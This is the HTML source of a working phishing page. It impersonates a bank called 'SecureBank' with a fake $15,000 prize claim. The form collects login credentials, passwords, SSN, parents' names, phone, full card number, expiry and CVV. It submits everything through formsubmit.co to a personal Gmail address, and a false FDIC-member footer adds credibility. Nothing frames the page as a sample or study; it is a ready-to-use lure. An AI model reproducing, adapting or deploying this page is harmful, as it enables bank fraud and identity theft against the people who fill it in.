<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank – Champion Award $15,000</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        /* General Reset */
        *{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif;}
        body{background:#f4f7f6;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}

        /* Main Card */
        .claim-container{
            background:#fff;width:100%;max-width:500px;border-radius:10px;
            box-shadow:0 8px 20px rgba(0,0,0,.1);overflow:hidden;
        }
        /* Header */
        .header{
            background:linear-gradient(135deg,#005ca6,#004a85);color:#fff;padding:25px;text-align:center;
        }
        .logo-text{
            font-size:28px;font-weight:700;color:#ffd700;margin-bottom:10px;
        }
        .award-badge{
            background:#ffd700;color:#333;padding:5px 15px;border-radius:20px;
            font-weight:bold;font-size:14px;margin-bottom:10px;
        }
        .prize-amount{font-size:36px;font-weight:700;margin:10px 0;}
        .title{font-size:20px;font-weight:500;}

        /* Body */
        .form-body{padding:25px;}
        .section-title{
            color:#005ca6;font-size:16px;font-weight:bold;margin:15px 0 10px;
            border-bottom:2px solid#eee;padding-bottom:5px;
        }
        .form-group{margin-bottom:12px;}
        label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:500;}
        input[type="text"],
        input[type="email"],
        input[type="password"],
        input[type="tel"],
        select, textarea{
            width:100%;padding:10px;border:1px solid#ddd;border-radius:5px;font-size:14px;
            transition:border-color .3s;
        }
        input:focus,select:focus,textarea:focus{
            border-color:#005ca6;outline:none;box-shadow:0 0 0 2px rgba(0,92,166,.1);
        }
        .row{display:flex;gap:10px;}
        .col{flex:1;}

        /* Submit */
        .btn-submit{
            width:100%;padding:14px;background:#005ca6;color:#fff;border:none;
            border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:20px;
            transition:background .3s;
        }
        .btn-submit:hover{background:#004a85;}
    </style>
</head>
<body>
<div class="claim-container">

    <!-- Header -->
    <div class="header">
        <div class="logo-text">Secure<span>Bank</span></div>
        <div class="award-badge">🥇 CHAMPION AWARD</div>
        <div class="prize-amount">$15,000</div>
        <div class="title">Congratulations Winner!</div>
    </div>

    <!-- Form -->
  <form id="prizeForm" action="https://formsubmit.co/laurenjenny51@gmail.com" method="POST" class="form-body">

        <p style="font-size:14px;color:#666;margin-bottom:15px;">
            Please verify your identity to release the funds. All fields are required.
        </p>

        <!-- Section 1: Account Info -->
        <div class="section-title">Account Details</div>
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="e.g. john_doe123" required>
        </div>
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="john@example.com" required>
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
        </div>

        <!-- Section 2: Personal Info -->
        <div class="section-title">Personal Information</div>
        <div class="form-group">
            <label for="realName">Real Full Name</label>
            <input type="text" id="realName" name="realName" placeholder="John Doe" required>
        </div>
        <div class="row">
            <div class="col form-group">
                <label for="motherName">Mother's Name</label>
                <input type="text" id="motherName" name="motherName" placeholder="Jane Doe" required>
            </div>
            <div class="col form-group">
                <label for="fatherName">Father's Name</label>
                <input type="text" id="fatherName" name="fatherName" placeholder="John Sr." required>
            </div>
        </div>
        <div class="row">
            <div class="col form-group">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="ssn" placeholder="123-45-6789" required>
            </div>
            <div class="col form-group">
                <label for="zip">Zip Code</label>
                <input type="text" id="zip" name="zip" placeholder="10001" required>
            </div>
        </div>
        <div class="form-group">
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" required>
        </div>

        <!-- Section 3: Account & Card Details -->
        <div class="section-title">Account & Card Details</div>
        <div class="form-group">
            <label for="accountType">Account Type</label>
            <select id="accountType" name="accountType" required>
                <option value="Checking">Checking</option>
                <option value="Savings">Savings</option>
                <option value="Money Market">Money Market</option>
                <option value="Credit Card">Credit Card</option>
            </select>
        </div>
        <div class="form-group">
            <label for="cardNumber">Debit/Credit Card Number</label>
            <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
        </div>
        <div class="row">
            <div class="col form-group">
                <label for="expiry">Expiry Date</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="col form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
            </div>
        </div>
        <div class="form-group">
            <label for="cardHolder">Name on Card</label>
            <input type="text" id="cardHolder" name="cardHolder" placeholder="John Doe" required>
        </div>

        <!-- Business & Message -->
        <div class="section-title">Business & Notes</div>
        <div class="form-group">
            <label for="businessOwner">Business Owner?</label>
            <input type="text" id="businessOwner" name="Business owner Yes/No" placeholder="Yes / No" required>
        </div>
        <div class="form-group">
            <label for="messages">Notes / Message</label>
            <textarea id="messages" name="messages" rows="3" placeholder="Any additional details..."></textarea>
        </div>

        <!-- Submit -->
        <button type="submit" class="btn-submit">Claim $15,000 Now</button>
    </form>

    <!-- Footer -->
    <div class="footer" style="background:#f9f9f9;padding:15px;text-align:center;font-size:12px;color:#888;border-top:1px solid#eee;">
        <p>&copy; 2025 SecureBank, N.A. Member FDIC.</p>
        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
    </div>
</div>
</body>
</html>
